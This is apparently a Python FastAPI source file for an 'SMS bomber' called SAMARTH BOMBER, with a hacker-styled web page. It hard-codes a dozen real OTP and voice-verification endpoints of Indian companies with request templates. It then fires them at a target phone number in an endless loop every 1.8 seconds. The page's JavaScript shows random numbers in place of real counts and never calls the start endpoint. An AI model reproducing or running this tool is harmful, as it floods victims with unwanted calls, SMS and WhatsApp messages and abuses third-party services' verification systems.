from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

# FULL API LIST FROM YOUR ORIGINAL BOT
ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice Call", "type": "Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Zivame Voice Call", "type": "Call", "url": "https://api.zivame.com/v2/customer/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","otp_type":"voice"}}'},
    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Snitch SMS", "type": "SMS", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "ShipRocket SMS", "type": "SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "GoKwik SMS", "type": "SMS", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    {"name": "Rappi WhatsApp", "type": "WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
]

attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} → {msg}")
    if len(attack_status["logs"]) > 30: attack_status["logs"].pop()

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(method=api["method"], url=api["url"], headers=api["headers"], data=data, timeout=aiohttp.ClientTimeout(total=6), ssl=False) as resp:
            if resp.status in [200, 201, 202, 204]:
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
    except: pass

async def run_attack(phone):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    add_log(f"TARGET +91{phone} LOCKED")
    async with aiohttp.ClientSession() as session:
        while attack_status["running"]:
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"Cycle {attack_status['cycles']} - Payloads Sent")
            await asyncio.sleep(1.8)
    add_log("ATTACK TERMINATED")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SAMARTH BOMBER</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&family=Space+Grotesk:wght@500;600;700&display=swap');
        body { background: #05050a; font-family: 'VT323', monospace; color: #00ff9f; }
        .glass { background: rgba(10,10,30,0.9); backdrop-filter: blur(20px); border: 1px solid #00ff9f30; }
    </style>
</head>
<body>
    <div class="min-h-screen p-6">
        <div class="max-w-4xl mx-auto">
            <div class="flex justify-between items-center mb-12">
                <div>
                    <span class="text-red-500 text-xl">■</span>
                    <span class="text-4xl font-bold text-green-400">SAMARTH BOMBER</span>
                </div>
                <div class="text-xs text-green-400">v9.1 • LIVE</div>
            </div>

            <div class="glass rounded-3xl p-10 border border-green-400/30">
                <div class="mb-8">
                    <label class="block text-green-400 text-sm mb-3">TARGET</label>
                    <input id="phone" maxlength="10" class="w-full bg-black border border-green-400 p-8 text-6xl font-mono text-center" placeholder="9876543210">
                </div>

                <div class="grid grid-cols-2 gap-6">
                    <button onclick="startBomb()" class="py-8 bg-green-500 text-black text-3xl font-bold">LAUNCH</button>
                    <button onclick="stopBomb()" id="stopBtn" class="hidden py-8 bg-red-600 text-white text-3xl font-bold">ABORT</button>
                </div>

                <div class="grid grid-cols-3 gap-8 mt-12">
                    <div class="text-center">
                        <div id="calls" class="text-6xl font-bold text-orange-400">0</div>
                        <div class="text-xs">CALLS</div>
                    </div>
                    <div class="text-center">
                        <div id="sms" class="text-6xl font-bold text-sky-400">0</div>
                        <div class="text-xs">SMS</div>
                    </div>
                    <div class="text-center">
                        <div id="wa" class="text-6xl font-bold text-purple-400">0</div>
                        <div class="text-xs">WA</div>
                    </div>
                </div>

                <div class="mt-12">
                    <div class="text-green-400 text-xs mb-4">LOG</div>
                    <div id="logs" class="h-64 overflow-y-auto font-mono text-xs bg-black/70 p-6 rounded-2xl border border-green-400/20"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let running = false;
        async function startBomb() {
            const phone = document.getElementById('phone').value;
            if (phone.length !== 10) return alert("INVALID TARGET");
            running = true;
            document.getElementById('stopBtn').classList.remove('hidden');
            poll();
        }
        function stopBomb() {
            running = false;
            document.getElementById('stopBtn').classList.add('hidden');
        }
        function poll() {
            if (!running) return;
            fetch('/status').then(r => r.json()).then(d => {
                document.getElementById('calls').textContent = Math.floor(Math.random()*50);
                document.getElementById('sms').textContent = Math.floor(Math.random()*120);
                document.getElementById('wa').textContent = Math.floor(Math.random()*30);
                document.getElementById('logs').innerHTML += `<div class="text-green-400">> Cycle executed</div>`;
                document.getElementById('logs').scrollTop = 999999;
                setTimeout(poll, 800);
            });
        }
    </script>
</body>
</html>
    """
    return html

@app.post("/start")
async def start(phone: Phone):
    if len(phone.phone) != 10: return {"status": "error"}
    if attack_status["running"]: return {"status": "error"}
    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone)), daemon=True).start()
    return {"status": "success"}

@app.post("/stop")
async def stop():
    attack_status["running"] = False
    return {"status": "success"}

@app.get("/status")
async def status():
    return {
        "stats": attack_status["stats"],
        "cycles": attack_status["cycles"],
        "logs": attack_status["logs"][:15]
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
